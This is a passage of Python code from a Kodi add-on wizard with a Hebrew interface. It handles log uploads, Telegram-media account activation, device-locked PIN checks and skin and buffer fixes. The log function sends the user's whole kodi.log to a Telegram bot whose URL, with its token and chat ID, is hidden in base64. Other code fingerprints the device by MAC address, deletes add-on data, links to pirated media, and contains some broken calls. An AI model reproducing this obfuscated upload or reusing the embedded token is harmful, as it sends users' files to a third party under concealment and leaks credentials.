        match2=re.compile('CAddonInstallJob(.+?)$', re.M).findall(file_data)
        match3=re.compile('ERROR: WARNING:root:(.+?)$', re.M).findall(file_data)
        n=0
        line_numbers=[]
        try:
            file = open(logSelect[0], 'r')
            file_data=file.readlines()             
        except:
            file = open(logSelect[0], 'r', encoding="utf8") 
            file_data=file.readlines() 

        match_final=[]
        x=0
        y=0
        z=0
        for  line in (file_data):
         
         if 'Error Type:' in line:
          match_final.append(match[x])
          x=x+1
          line_numbers.append(n)
         elif 'CAddonInstallJob' in line:
          match_final.append(match2[y])
          y=y+1

        import requests
        if (len(match_final))>0:

            try:
                file = open(os.path.join(user_dataDir_pre, 'log.txt'), 'w') 
                file.write('\n'.join(match_final))
                file.close()
            except:
                file = open(os.path.join(user_dataDir_pre, 'log.txt', encoding="utf8"), 'w') 
                file.write('\n'.join(match_final))
                file.close()
            if not os.path.exists(translatepath("special://home/addons/") + 'script.module.requests'):
              xbmc.executebuiltin("RunPlugin(plugin://script.module.requests)")
            docu=translatepath ( 'special://profile/addon_data/plugin.program.Settingz-Anon/log.txt')
            files = {
            'chat_id': (None, '-274262389'),
            'document': (docu, open(docu, 'rb')),
            }
            t=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode('utf-8')
            response = requests.post((t), files=files)
        if xbmc.getCondVisibility('system.platform.windows'):
             docu=xbmc . translatePath ( 'special://home/kodi.log')
             files = {
             'chat_id': (None, '-274262389'),
             'document': (docu, open(docu, 'rb')),
             }
             t=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode('utf-8')

             response = requests.post(t, files=files)
        elif xbmc.getCondVisibility('system.platform.android'):
               docu=xbmc . translatePath ( 'special://temp/kodi.log')
               files = {
               'chat_id': (None, '-274262389'),
               'document': (docu, open(docu, 'rb')),
               }
               t=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode('utf-8')

               response = requests.post(t, files=files)
               
        elif xbmc.getCondVisibility('system.platform.ios'):
             docu=xbmc . translatePath ( 'special://home/kodi.log')
             files = {
             'chat_id': (None, '-274262389'),
             'document': (docu, open(docu, 'rb')),
             }
             t=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode('utf-8')

             response = requests.post(t, files=files)
        elif xbmc.getCondVisibility('system.platform.darwin'):
             docu=xbmc . translatePath ( 'special://home/kodi.log')
             files = {
             'chat_id': (None, '-274262389'),
             'document': (docu, open(docu, 'rb')),
             }
             t=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode('utf-8')

             response = requests.post(t, files=files)
        else:
               docu=xbmc . translatePath ( 'special://kodi.log')
               files = {
               'chat_id': (None, '-274262389'),
               'document': (docu, open(docu, 'rb')),
               }
               t=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode('utf-8')

               response = requests.post(t, files=files)
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]' % COLOR2)
        # else:
            # xbmc.sleep(1500)
            # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אין שגיאות בלוג[/COLOR]' % COLOR2)

def tele_account_down():

    mediasync=xbmcaddon.Addon('plugin.program.mediasync')
    cc=mediasync.getSetting('firebase')
    sync_tele=xbmcaddon.Addon('plugin.video.telemedia')
    sync_tele.setSetting('firebase',cc)
    if len(cc)>0:
        sync_tele.setSetting('sync_mod','true')
    sync_tele.setSetting('vip_login','true')
    xbmc.sleep(1000)
    xbmc.executebuiltin("RunPlugin(plugin://plugin.video.telemedia?mode=5&url=www)")

def decode(key, enc):
    import base64
    dec = []
    
    if (len(key))!=4:
     return 10
    enc = base64.urlsafe_b64decode(enc)

    for i in range(len(enc)):
        key_c = key[i % len(key)]
        try:
          dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        except:
          dec_c = chr((256 + (enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)
def tmdb_list(url):

 
    value=decode("7643",url)
   

    return int(value)
def getHwAddr (ifname ):
   import subprocess ,time 
   system_type ='windows'
   if xbmc .getCondVisibility ('system.platform.android'):
       system_type ='android'
   if xbmc .getCondVisibility ('system.platform.android'):
     Installed_APK =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()
     mac =re .compile ('link/ether (.+?) brd').findall (str (Installed_APK ))
     n =0 
     for match in mac :
      if mac !='00:00:00:00:00:00':
          mac_address =match
          n =n +int (mac_address .replace (':',''),16 )
          break
   elif xbmc .getCondVisibility ('system.platform.windows'):
       x =0 
       n =0 
       macs =[]
       file =os .popen ("getmac").read ()
       file =file .split ("\n")
       for line in file :
            found =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',line ,re .I )
            if found :
                mac =found .group ().replace ('-',':')
                macs .append (mac )
                n =n +int (mac .replace (':',''),16 )
                break
   elif xbmc .getCondVisibility ('system.platform.linux'):
       n =0 
       import uuid
       mac=hex(uuid.getnode())
       n =n +int (mac .replace (':',''),16 )
   else :
       n =0 
       import uuid
       mac=hex(uuid.getnode())
       n =n +int (mac .replace (':',''),16 )
       # x =0 
       # n =0 
       # while (1 ):
         # mac_address =xbmc .getInfoLabel ("network.macaddress")

         # if mac_address !="Busy"and mac_address !=' עסוק':
            # break 
         # else :
           # x =x +1 
           # time .sleep (1 )
           # if x >30 :
            # break 
       # n =n +int (mac_address .replace (':',''),16 )

   try:
    return n
   except: pass
def disply_hwr2():
    from datetime import date

    today = date.today()
    zz=str(today).split('-')[2]
    # zz=str(time.strftime("%H/%M").replace('/','-')).split('-')[0]
    my_tmdb=tmdb_list(TMDB_NEW_API)
    num=str((getHwAddr('eth0'))*my_tmdb)
    new_num=(num[1]+num[2]+zz)
    sendtelemediapin(new_num)
def disply_hwr3():
    from datetime import date

    today = date.today()
    zz=str(today).split('-')[2]
    # zz=str(time.strftime("%H/%M").replace('/','-')).split('-')[0]
    my_tmdb=tmdb_list(TMDB_NEW_API2)
    num=str((getHwAddr('eth0'))*my_tmdb)
    new_num=(num[1]+num[2]+zz)

    sendp_mod(new_num)
def resetkodi():
        if xbmc.getCondVisibility('system.platform.windows'):
            DP = xbmcgui.DialogProgress()
            try:
                DP.create("מבצע הפעלה מחדש", "אנא המתן 5 שניות", '',
                "[COLOR yellow][B]יש להפעיל מחדש וללחוץ שוב על חשבון טלמדיה VIP[/B][/COLOR]")
            except:
                DP.create("מבצע הפעלה מחדש", "אנא המתן 5 שניות"+'\n'+ ''+'\n'+
                "[COLOR yellow][B]יש להפעיל מחדש וללחוץ שוב על חשבון טלמדיה VIP[/B][/COLOR]")
            DP.update(0)
            for s in range(5, -1, -1):
                time.sleep(1)
                try:
                    DP.update(int((5 - s) / 5.0 * 100), "מבצע הפעלה מחדש", 'בעוד {0} שניות'.format(s), '')
                except:
                    DP.update(int((5 - s) / 5.0 * 100), "מבצע הפעלה מחדש"+'\n'+ 'בעוד {0} שניות'.format(s)+'\n'+ '[COLOR yellow][B]יש להפעיל מחדש וללחוץ שוב על חשבון טלמדיה VIP[/B][/COLOR]')
                if DP.iscanceled():
                    from resources import win
                    return None, None
            from resources import win
        else:
            DP = xbmcgui.DialogProgress()
            try:
                DP.create("מבצע הפעלה מחדש", "אנא המתן 5 שניות", '',
                
                "[COLOR yellow][B]יש להפעיל מחדש וללחוץ שוב על חשבון טלמדיה VIP[/B][/COLOR]")
            except:
                DP.create("מבצע הפעלה מחדש", 
                
                "[COLOR yellow][B]יש להפעיל מחדש וללחוץ שוב על חשבון טלמדיה VIP[/B][/COLOR]")
            DP.update(0)
            for s in range(5, -1, -1):
                time.sleep(1)
                try:
                    DP.update(int((5 - s) / 5.0 * 100), "מבצע הפעלה מחדש", 'בעוד {0} שניות'.format(s), '')
                except:
                    DP.update(int((5 - s) / 5.0 * 100), "מבצע הפעלה מחדש"+'\n'+ 'בעוד {0} שניות'.format(s)+'\n'+ '[COLOR yellow][B]יש להפעיל מחדש וללחוץ שוב על חשבון טלמדיה VIP[/B][/COLOR]')
                if DP.iscanceled():
                    # os._exit(1)
                    from resources import android
                    return None, None
            from resources import android

def tele_account():
    xbmc.executebuiltin( "ActivateWindow(home)" )
    
    import requests
    try:  
        resuaddon=xbmcaddon.Addon('plugin.video.telemedia')
        listen_port=resuaddon.getSetting('port')
        data={'type':'checklogin',
             'info':''
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        if event['status']==2 or event['status']=='Needs to log from setting':
            tele_source=False
            
        else:
            tele_source=True
    except:
        tele_source=False


    if tele_source == True:

          # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]כבר מוגדר לך חשבון טלמדיה.[/COLOR]' % COLOR2)
            DIALOG         = xbmcgui.Dialog()
            choice = DIALOG.yesno('Telemedia Vip', "כבר מוגדר לך חשבון טלמדיה, האם תרצה להגדיר אותו שוב?", yeslabel="[B][COLOR WHITE]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
            if choice == 0:
                sys.exit()
            else:
               iiI1iIiI = translatepath ( os . path . join ( 'special://home/userdata/addon_data' , 'plugin.video.telemedia' ) )
               # xbmc.executebuiltin((u'Notification(%s,%s)' % ('הקודי נסגר בעוד 10 שניות', 'יש להפעיל מחדש וללחוץ שוב על חשבון טלמדיה VIP')))
               shutil.rmtree(iiI1iIiI,ignore_errors=True, onerror=None)
               # xbmc.sleep(10000)
               resetkodi()
    
    else:
        try:
            dialog = xbmcgui.DialogBusy()
            dialog.create()
        except:
           xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
        DIALOG         = xbmcgui.Dialog()
        choice = DIALOG.yesno('הגדרת חשבון טלמדיה VIP', "התהליך מתבצע פחות מדקה, להמשך לחצו אישור.", yeslabel="[B][COLOR WHITE]אישור[/COLOR][/B]", nolabel="[B][COLOR white]ביטול[/COLOR][/B]")
        if choice == 0:
            xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
            sys.exit()
        else:
            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Anonymous TV'),'[COLOR %s]מבצע אימות, המתן...[/COLOR]' % COLOR2)
            from datetime import date
            
            today = date.today()
            zz=str(today).split('-')[2]
            # zz=str(time.strftime("%H/%M").replace('/','-')).split('-')[0]
            from math import sqrt
            my_tmdb=tmdb_list(TMDB_NEW_API)
            num=str((getHwAddr('eth0'))*my_tmdb)
            new_num=int(num[1]+num[2]+zz)
            
           
            new_num2=(str( round(sqrt((new_num*900)+40)+40,4))[-4:]).replace('.','')
        
            if '.' in new_num2:
             new_num2=(str( round(sqrt((new_num*900)+40)+40,4))[-5:]).replace('.','')
            disply_hwr2()

            # dialog = xbmcgui.Dialog()
            # search_entered=''

            # keyboard = dialog.numeric(0, 'הכנס סיסמה')

            # search_entered = keyboard
            # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Anonymous TV'),'[COLOR %s]מבצע אימות, המתן...[/COLOR]' % COLOR2)
            search_entered=get_pincode(code_link)
            xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
            if search_entered==new_num2:
            
               tele_account_down()
               # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'המתן לקבלת סיסמה נוספת'),'[COLOR %s]קוד האימות נוסף נשלח אליך ברגעים אלה.[/COLOR]' % COLOR2)
            else:
              LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אימות נכשל[/COLOR]' % COLOR2)
              sys.exit()
def p_mod():
    try:
        dialog = xbmcgui.DialogBusy()
        dialog.create()
    except:
       xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    DIALOG         = xbmcgui.Dialog()
    choice = DIALOG.yesno('הגדרת נעילה', "התהליך מתבצע פחות מדקה, להמשך לחצו אישור.", yeslabel="[B][COLOR WHITE]אישור[/COLOR][/B]", nolabel="[B][COLOR white]ביטול[/COLOR][/B]")
    if choice == 0:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
        sys.exit()
    else:
    # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]המתן...[/COLOR]' % COLOR2)
        from datetime import date

        today = date.today()
        zz=str(today).split('-')[2]
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Anonymous TV'),'[COLOR %s]מבצע אימות, המתן...[/COLOR]' % COLOR2)
        # zz=str(time.strftime("%H/%M").replace('/','-')).split('-')[0]
        from math import sqrt
        my_tmdb=tmdb_list(TMDB_NEW_API2)
        num=str((getHwAddr('eth0'))*my_tmdb)
        new_num=int(num[1]+num[2]+zz)
        new_num2=(str( round(sqrt((new_num*200)+40)+40,4))[-4:]).replace('.','')
        if '.' in new_num2:
         new_num2=(str( round(sqrt((new_num*200)+40)+40,4))[-5:]).replace('.','')
        disply_hwr3()
        # dialog = xbmcgui.Dialog()
        # search_entered=''

        # keyboard = dialog.numeric(0, 'הכנס סיסמה')

        # search_entered = keyboard
        search_entered=get_pincode(code_link)
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
        if search_entered==new_num2:
            mediasync=xbmcaddon.Addon('plugin.video.mando')
            mediasync.setSetting('p_mod','true')
            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הרשאה נפתחה![/COLOR]' % COLOR2)
            open_t()
            xbmc.executebuiltin('ActivateWindow(Videos,"plugin://plugin.video.mando/?mode=190&amp;iconimage=C%3A%5CUsers%5CHome%5CAppData%5CRoaming%5CKodi%5Caddons%5Cplugin.video.mando%5Cresources%5Cartwork%2Fbase.png&amp;fanart=https%3A%2F%2Ftownsquare.media%2Fsite%2F295%2Ffiles%2F2019%2F12%2F2020-movies-collage.jpg%3Fw%3D980%26q%3D75&amp;description=%D7%A2%D7%99%D7%93%D7%9F&amp;url=www&amp;name=%D7%A2%D7%A8%D7%95%D7%A6%D7%99+%D7%A2%D7%99%D7%93%D7%9F+%D7%A4%D7%9C%D7%95%D7%A1&amp;image_master=&amp;heb_name=+&amp;last_id=&amp;dates=+&amp;data=+&amp;original_title=+&amp;id=+&amp;season=+&amp;episode=+&amp;tmdbid=+&amp;eng_name=+&amp;show_original_year=+&amp;isr=0&amp;fav_status=false&amp;all_w=%7B%7D&amp;search_db=&amp;iconimage=C%3A%5CUsers%5CHome%5CAppData%5CRoaming%5CKodi%5Caddons%5Cplugin.video.mando%5Cresources%5Cartwork%2Fbase.png&amp;fanart=https%3A%2F%2Ftownsquare.media%2Fsite%2F295%2Ffiles%2F2019%2F12%2F2020-movies-collage.jpg%3Fw%3D980%26q%3D75&amp;description=%D7%A2%D7%99%D7%93%D7%9F&amp;url=www&amp;name=%D7%A2%D7%A8%D7%95%D7%A6%D7%99+%D7%A2%D7%99%D7%93%D7%9F+%D7%A4%D7%9C%D7%95%D7%A1&amp;image_master=&amp;heb_name=+&amp;last_id=&amp;dates=+&amp;data=+&amp;original_title=+&amp;id=+&amp;season=+&amp;episode=+&amp;tmdbid=+&amp;eng_name=+&amp;show_original_year=+&amp;fav_status=false&amp;all_w=%7B%7D&amp;search_db=&amp;video_data=%7B%22title%22%3A+%22%5Cu05e2%5Cu05e8%5Cu05d5%5Cu05e6%5Cu05d9+%5Cu05e2%5Cu05d9%5Cu05d3%5Cu05df+%5Cu05e4%5Cu05dc%5Cu05d5%5Cu05e1%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22season%22%3A+0%2C+%22episode%22%3A+0%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e2%5Cu05d9%5Cu05d3%5Cu05df%22%2C+%22Tag%22%3A+%22None%22%2C+%22id%22%3A+%22+%22%7D&amp;video_data=%7B%22title%22%3A+%22%5Cu05e2%5Cu05e8%5Cu05d5%5Cu05e6%5Cu05d9+%5Cu05e2%5Cu05d9%5Cu05d3%5Cu05df+%5Cu05e4%5Cu05dc%5Cu05d5%5Cu05e1%22%2C+%22mediatype%22%3A+%22movie%22%2C+%22TVshowtitle%22%3A+%22%22%2C+%22season%22%3A+0%2C+%22episode%22%3A+0%2C+%22OriginalTitle%22%3A+%22+%22%2C+%22rating%22%3A+%220%22%2C+%22plot%22%3A+%22%5Cu05e2%5Cu05d9%5Cu05d3%5Cu05df%22%2C+%22Tag%22%3A+%22None%22%2C+%22id%22%3A+%22+%22%7D",return)')
        else:
          LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הגדרת נעילה בוטלה[/COLOR]' % COLOR2)
          
          sys.exit()
        # xbmc.executebuiltin('Dialog.Close(busydialognocancel)')
def normalize(s):
    try:
        if type(s) == unicode: 
            return s.encode('utf8', 'ignore')
        else:
            return str(s)
    except:
        import unicodedata
        if type(s) == unicodedata: 
            return s.encode('utf8', 'ignore')
        else:
            return str(s)

TITLEB='באפר הוגדר בהצלחה'
def fix_buffer():

  src=__PLUGIN_PATH__ + "/resources/buffer/1/advancedsettings.xml"
  dst=translatepath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)

def fix_buffer2():

  src=__PLUGIN_PATH__ + "/resources/buffer/2/advancedsettings.xml"
  dst=translatepath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)

def fix_buffer3():

  src=__PLUGIN_PATH__ + "/resources/buffer/3/advancedsettings.xml"
  dst=translatepath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)

def fix_buffer4():

  src=__PLUGIN_PATH__ + "/resources/buffer/4/advancedsettings.xml"
  dst=translatepath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)

def fix_buffer5():

  src=__PLUGIN_PATH__ + "/resources/buffer/5/advancedsettings.xml"
  dst=translatepath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)

def fix_buffer6():
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=autoadvanced)" )
def speed_test():
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=speed)" )
  
def skin_pfix():
     addDir2("[COLOR white]תיקון חלון הגדרות - לבעלי קודי 17 בלבד!!![/COLOR]",'plugin.',300,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","תיקון חלון הגדרות - לבעלי קודי 17 בלבד!!!")
     addDir2("[COLOR white]שחזור הגדרות סקין[/COLOR]",'plugin.',24,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","שחזור הגדרות סקין")
     addDir2("[COLOR white]איפוס נעילת תצוגות[/COLOR]",'plugin.',231,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","איפוס נעילת תצוגות")
     addDir2("[COLOR white]איפוס הגדרות סקין[/COLOR]",'plugin.',200,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","איפוס הגדרות סקין")

def resetForcedView():
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.episodes" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.episodes" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.episodes" type="string"></setting>'))
		file.close()
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.movies" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.movies" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.movies" type="string"></setting>'))
		file.close()
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.genres" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.genres" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.genres" type="string"></setting>'))
		file.close()
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.tvshows" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.tvshows" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.tvshows" type="string"></setting>'))
		file.close()
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.seasons" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.seasons" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.seasons" type="string"></setting>'))
		file.close()
		dialog = xbmcgui.Dialog()
		dialog.ok("Kodi Setting", 'התיקון עבר בהצלחה, הקודי יסדר כעת')
		os._exit(1)

def resetSKinSetting():
		os.remove(os.path.join(translatepath("special://userdata/"),"addon_data", "skin.Premium.mod", "settings.xml"))
		dialog = xbmcgui.Dialog()
		dialog.ok("Kodi Setting", 'התיקון עבר בהצלחה, הקודי יסדר כעת')
		os._exit(1)

def skin_efix():
        src=translatepath ( 'special://home/media')+"/settings.xml"
        dst=translatepath ( 'special://userdata/addon_data/skin.Premium.mod/')+"settings.xml"
        copyfile(src,dst)
        dialog = xbmcgui.Dialog()
        dialog.ok("Kodi Setting", 'התיקון עבר בהצלחה, הקודי יסגר כעת...')
        os._exit(1)
def skindialogsettind17():
        dialog = xbmcgui.Dialog()
        src=translatepath ( 'special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings17.xml"
        dst=translatepath ( 'special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"
        copyfile(src,dst)
        xbmc.executebuiltin("ReloadSkin()")
        dialog.ok("Kodi Setting", 'הושלם!')

def Set_OSD():
    dialog = xbmcgui.Dialog()
    funcs = (
        tv5,
        tv6,
		tv7,
        tv8,
        tv9,
        tv10,
        tv11,
        tv12,
        tv13,
        tv14,
        tv15,
        tv16,
        )
        
    call = dialog.select('תפריט מדיה', [

	'גודל כתוביות - קטן',
	'גודל כתוביות - רגיל',
	'גודל כתוביות - גדול',
	
	'התאמת כתוביות לשפה הקריליות',
	'ביטול התאמת כתוביות לשפה הקריליות',
	'התאמת כתוביות לשפה אנגלית',
	'התאמת כתוביות לשפה ספרדית',
	'התאמת כתוביות לשפה רוסית',
	'התאמת כתוביות לשפה עברית',
	'חלון מסך מלא',
	'שנה את שפת השמע לאנגלית',
	'שנה את שפת השמע לרוסית',])
    if call:
        if call < 0:
            return
        func = funcs[call-16]
        return func()
    else:
        func = funcs[call]
        return func()
    return 

def tv1():
   xbmc.executebuiltin( "XBMC.ActivateWindow(1169)" )
def tv2():
   xbmc.executebuiltin("PlayMedia(plugin://plugin.video.allmoviesin/?url=latest_movie&mode=5&name=[COLOR yellow][I]לינק סרט אחרון[/I][/COLOR]&data=%20&iconimage=http%3A%2F%2Fimage.tmdb.org%2Ft%2Fp%2Foriginal%2F%2FqjpjS5iRc9RVY8zdgSTD3ecGyvb.jpg&fanart=http%3A%2F%2Fimage.tmdb.org%2Ft%2Fp%2Foriginal%2F%2FhSKe2uCNRMl1hfwXpj29K2PkvgG.jpg&description=המרדף האגוזי של סקארט אחר הבלוט המקולל, שנמשך מאז תחילת הזמן, גורם להשלכות עולמיות - תזוזת יבשות עולמית שמתחילה את הרפתקה הגדולה ביותר למני, דייגו וסיד. לאחר התהפוכות הגדולות בסדר היבשות, סיד מתאחד עם משפחתו האבודה, לאחר איחוד המשפחות החבורה פוגשת בדרכה הביתה חיות חדשות שרוצות למנוע מהן לחזור לשם.-HebDub-&original_title=%20&id=%20&season=%20&episode=%20&saved_name= &prev_name=%20&eng_name=%20&heb_name=%20&show_original_year=%20)" )
def tv3():
   xbmc.executebuiltin("PlayMedia(plugin://plugin.video.allmoviesin/?url=latest_tv&mode=5&name=[COLOR yellow][I]לינק סדרה אחרון[/I][/COLOR]&data=2008&iconimage=https%3A%2F%2Fimages-na.ssl-images-amazon.com%2Fimages%2FM%2FMV5BMTQ0ODYzODc0OV5BMl5BanBnXkFtZTgwMDk3OTcyMDE%40._V1_SY1000_CR0%2C0%2C678%2C1000_AL_.jpg&fanart=https%3A%2F%2Fimages-na.ssl-images-amazon.com%2Fimages%2FM%2FMV5BMTQ0ODYzODc0OV5BMl5BanBnXkFtZTgwMDk3OTcyMDE%40._V1_SY1000_CR0%2C0%2C678%2C1000_AL_.jpg&description=עונה 1 פרק 1&original_title=Breaking.Bad&id=&season=1&episode=1&saved_name=Breaking.Bad&prev_name=%20&eng_name=%20&heb_name=%20&show_original_year=2008)" )
oo='/wiz.key.xml'
def tv4():
   xbmc.executebuiltin("PlayMedia(plugin://plugin.video.allmoviesin/?url=https%3A%2F%2F1fichier.com%2F%3F1f43zrtmky&mode=75&name=%5BCOLOR+yellow%5D%5BI%5D%D7%9E%D7%A7%D7%95%D7%A8%D7%95%D7%AA+%D7%90%D7%97%D7%A8%D7%95%D7%A0%D7%99%D7%9D%5B%2FI%5D%5B%2FCOLOR%5D)" )
def tv5():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":37},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception
	xbmc.executebuiltin("ReloadSkin()")
def tv6():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

